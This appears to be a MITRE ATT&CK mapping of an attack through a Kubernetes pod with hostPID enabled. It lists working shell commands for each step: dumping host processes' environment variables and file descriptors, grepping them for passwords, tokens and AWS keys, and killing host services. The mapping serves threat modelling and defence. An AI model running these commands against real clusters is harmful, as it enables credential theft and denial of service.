# MITRE ATT&CK Mapping: HostPID Pod

## Attack Flow

```
Initial Access → Execution → Discovery → Collection → Impact
```

---

## MITRE ATT&CK Techniques

### 1. Initial Access

#### T1078 - Valid Accounts
**Behavior:** Attacker uses compromised Kubernetes credentials

**Procedures:**
```bash
kubectl apply -f hostpid-exec-pod.yaml
```

---

### 2. Execution

#### T1609 - Container Administration Command
**Behavior:** Execute commands in container via kubectl exec

**Procedures:**
```bash
kubectl exec -it hostpid-exec-pod -- bash
```

#### T1059.004 - Command and Scripting Interpreter: Unix Shell
**Behavior:** Execute bash commands to enumerate host processes

**Procedures:**
```bash
ps aux
for e in `ls /proc/*/environ`; do echo; echo $e; xargs -0 -L1 -a $e; done > envs.txt
for fd in `find /proc/*/fd`; do ls -al $fd/* 2>/dev/null | grep \>; done > fds.txt
```

---

### 3. Discovery

#### T1057 - Process Discovery
**Behavior:** View all processes running on the host

**Procedures:**
```bash
ps aux
ps -ef
```

#### T1082 - System Information Discovery
**Behavior:** Enumerate processes by UID to identify privilege levels

**Procedures:**
```bash
ps auxn | awk '{print $1}' | sort | uniq -c | sort -rn
```

---

### 4. Collection

#### T1005 - Data from Local System
**Behavior:** Access environment variables and file descriptors of host processes

**Environment Variables:**
```bash
for e in `ls /proc/*/environ`; do 
  echo; echo $e
  xargs -0 -L1 -a $e
done > envs.txt

# Look for secrets
grep -i "password\|token\|key\|secret" envs.txt
```

**File Descriptors:**
```bash
for fd in `find /proc/*/fd`; do 
  ls -al $fd/* 2>/dev/null | grep \>
done > fds.txt

# Read files via FD
cat /proc/[PID]/fd/4
```

#### T1552.001 - Unsecured Credentials: Credentials In Files
**Behavior:** Extract credentials from process environment variables and file descriptors

**Procedures:**
```bash
# Found in process command line
ps aux | grep -i "password\|token"

# Found in environment variables
grep "AWS_ACCESS_KEY_ID\|AWS_SECRET_ACCESS_KEY" envs.txt

# Found in file descriptors
cat /proc/635813/fd/4  # Read vim swp file
```

---

### 5. Impact

#### T1489 - Service Stop
**Behavior:** Kill processes on host (Denial of Service)

**Procedures:**
```bash
pkill -f "nginx"
kill -9 [PID]
```

---

## Technique Summary

| Tactic | Technique ID | Technique Name |
|--------|-------------|----------------|
| Initial Access | T1078 | Valid Accounts |
| Execution | T1609 | Container Administration Command |
| Execution | T1059.004 | Unix Shell |
| Discovery | T1057 | Process Discovery |
| Discovery | T1082 | System Information Discovery |
| Collection | T1005 | Data from Local System |
| Collection | T1552.001 | Credentials In Files |
| Impact | T1489 | Service Stop |

**Total: 8 Techniques across 5 Tactics**

**Pod Configuration:**
```yaml
spec:
  hostPID: true
```

**Key Features:**
- View all host processes (ps aux)
- Access /proc/[PID]/environ for environment variables
- Access /proc/[PID]/fd/* for file descriptors
- Kill any process on host
- No direct path to root, but can find credentials
